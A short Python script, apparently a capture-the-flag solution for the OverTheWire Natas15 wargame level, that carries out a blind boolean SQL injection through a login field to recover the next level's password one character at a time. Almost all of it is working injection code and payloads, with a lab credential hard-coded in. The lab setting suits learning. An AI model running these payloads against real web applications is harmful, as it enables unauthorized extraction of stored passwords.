# Natas15 python solution
# By Emil 'Dota' Bak, 2019

import requests

# ***********************************************
URL = "http://natas15.natas.labs.overthewire.org/"

auth_name = 'natas15'
auth_pass = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

s      = requests.Session()
s.auth = (auth_name,auth_pass)
# ***********************************************

# To guess the password, one of each letter is needed
alphabet      = [chr(x) for x in range(ord('A'),ord('Z'))]
alphabet     += [chr(x) for x in range(ord('a'),ord('z'))]
alphabet     += [str(x) for x in range(0,10)]

known_letters = ""
password      = ""

# While not possible to SQL inject the entire password in one payload,
# it is possible to ask simple questions via SQL (using LIKE BINARY and '%')
# To properly guess the password, the user can make a list of all chars found in
# natas16's password, followed by another series of requests, to reveal the
# correct ordering of the chars in the password.

for letter in alphabet:
        # LIKE BINARY "%'a'%" checks if 'a' exists in a given querry
    DATA = dict(username='natas16" and password LIKE BINARY "%' + letter + '%" #')
    r    = s.post(URL, data=DATA)
    if 'This user exists' in r.text:
        known_letters += letter

for x in range (0,32):
    for letter in known_letters:
            # LIKE BINARY "'a'%" checks if 'a' is the FIRST letter in a given querry"
        DATA = dict(username='natas16" and password LIKE BINARY "' + password + letter + '%" #')
        r    = s.post(URL, data=DATA)
        if 'This user exists' in r.text:
            password += letter
            print password

if len(password) == 32:
    print "Password retrieved successfully!"